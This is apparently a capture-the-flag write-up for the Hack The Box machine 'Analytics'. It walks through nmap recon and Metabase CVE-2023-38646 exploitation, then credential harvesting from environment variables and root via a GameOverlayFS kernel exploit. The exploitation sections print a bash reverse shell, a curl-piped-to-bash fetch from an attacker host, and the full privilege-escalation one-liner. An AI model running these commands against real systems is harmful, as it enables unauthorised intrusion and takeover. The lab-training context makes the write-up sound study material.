---
title:  "HTB Analytics Writeup"
date:   2024-03-23 00:30:00 
categories: HTB Machine
tags: metabase CVE-2023-38646 environment_variables GameOverlayFS
---

![Analytics](/assets/img/Analytics/1696518021638.jpg)

## Introduction 

Analytics was a text book easy machine,To solve it you need to identify and abuse two publicly known vulnerabilities. The initial access costed me a little bit more time because of some syntax issues but once you got the hang of it it wasn't that hard. Root was a fun to exploit the now quite popular GameOverlayFS exploit


If you like any of my content it would help a lot if you used my referral link to buy Hack The Box/Academy Subscriptions which you can find on my about page.

## Initial access
### Recon

To start off our recon we will begin with an Nmap scan of the machine. Using the following command:
```
sudo nmap -sS -A  -p-  -o nmap  10.10.11.233
```
**Nmap**
```
# Nmap 7.94 scan initiated Sat Jan  6 13:21:47 2024 as: nmap -sS -A -p- -o nmap 10.10.11.233
Nmap scan report for 10.10.11.233
Host is up (0.026s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://analytical.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.94%E=4%D=1/6%OT=22%CT=1%CU=39066%PV=Y%DS=2%DC=T%G=Y%TM=65999A66
OS:%P=x86_64-pc-linux-gnu)SEQ(SP=106%GCD=1%ISR=109%TI=Z%CI=Z%II=I%TS=A)OPS(
OS:O1=M53CST11NW7%O2=M53CST11NW7%O3=M53CNNT11NW7%O4=M53CST11NW7%O5=M53CST11
OS:NW7%O6=M53CST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88)ECN(
OS:R=Y%DF=Y%T=40%W=FAF0%O=M53CNNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS
OS:%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=
OS:Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=
OS:R%O=%RD=0%Q=)T7(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T
OS:=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=
OS:S)

Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT      ADDRESS
1   22.75 ms 10.10.14.1
2   22.86 ms 10.10.11.233

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Sat Jan  6 13:22:30 2024 -- 1 IP address (1 host up) scanned in 42.95 seconds
```
When reviewing the Nmap output we can see that only ssh and a web service. When going to the front page we can see that it is a static webpage. When going through the rest of the website i found a login panel which would redirect us to the subdomain **http://data.analytical.htb**


![Front page](/assets/img/Analytics/Analytics_01.png)


When checking out this subdomain we can see the login panel of metabase. When looking around for public exploits of metabase i found out that metabase recently had a new unauthenticated [remote code execution vulnerability](https://github.com/robotmikhro/CVE-2023-38646)

![Metabase login panel](/assets/img/Analytics/Analytics_02.png)

### Exploiting CVE-2023-38646
The exploit itself is not that complex but i experienced some difficulties with syntax. In the end the most stable way of getting a reverse shell was me hosting a reverse shell script on a webserver to then load it using a curl web request redirected to bash.

So first of all download the exploit using git

```bash
git clone https://github.com/robotmikhro/CVE-2023-38646.git
```

Next setup a webserver, we can do this with python using the following command

```bash
python -m http.server 80
```

Next create a file named exploit.sh in that webserver with the following contents

```bash
/bin/bash -i >& /dev/tcp/10.10.16.64/443 0>&1
```


Now that we have all our pre-requisites we can run the exploit script like so, This will execute a command that will load load our reverse shell on the machine.

```bash
python3 single.py -u http://data.analytical.htb --command="bash <(curl -s http://10.10.16.64/exploit.sh)"
```

![Exploit](/assets/img/Analytics/Analytics_03.png)

Then after a few seconds we'd get a reverse shell connection as the **metabase** user 

![Reverse shell](/assets/img/Analytics/Analytics_04.png)

## Lateral movement

So we landed on a docker container. While doing some basic enumeration I saw that there was some interesting information contained within the environment variables.You can check these values by running the env command.

```bash
env
```

In the output we can see the credentials of the **metalytics** user being **An4lytics_ds20223#**
```
env
SHELL=/bin/sh
MB_DB_PASS=
HOSTNAME=834c0dda368e
LANGUAGE=en_US:en
MB_JETTY_HOST=0.0.0.0
JAVA_HOME=/opt/java/openjdk
MB_DB_FILE=//metabase.db/metabase.db
PWD=/
LOGNAME=metabase
MB_EMAIL_SMTP_USERNAME=
HOME=/home/metabase
LANG=en_US.UTF-8
META_USER=metalytics
META_PASS=An4lytics_ds20223#
MB_EMAIL_SMTP_PASSWORD=
USER=metabase
SHLVL=5
MB_DB_USER=
FC_LANG=en-US
LD_LIBRARY_PATH=/opt/java/openjdk/lib/server:/opt/java/openjdk/lib:/opt/java/openjdk/../lib
LC_CTYPE=en_US.UTF-8
MB_LDAP_BIND_DN=
LC_ALL=en_US.UTF-8
MB_LDAP_PASSWORD=
PATH=/opt/java/openjdk/bin:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
MB_DB_CONNECTION_URI=
JAVA_VERSION=jdk-11.0.19+7
_=/usr/bin/env
```

When we use these credentials using SSH we were given access to the machine itself and not the docker container

```bash
ssh metalytics@analytics.htb
An4lytics_ds20223#
```

![Reverse shell](/assets/img/Analytics/Analytics_05.png)

## Privilege escalation

When checking machines kernel version we could see that this is an outdated version which should be vulnerable to the known exploit [GameOverlayFS](https://github.com/luanoliveira350/GameOverlayFS)

![Vulnerable kernel](/assets/img/Analytics/Analytics_06.png)

This exploit can be executed using the following commands. If everything goes well you'll get access to the system as root.

```bash
unshare -rm sh -c "mkdir l u w m && cp /u*/b*/p*3 l/;
setcap cap_setuid+eip l/python3;mount -t overlay overlay -o rw,lowerdir=l,upperdir=u,workdir=w m && touch m/*;" && u/python3 -c 'import os;os.setuid(0);os.system("sh")'
```

![Root access](/assets/img/Analytics/Analytics_07.png)
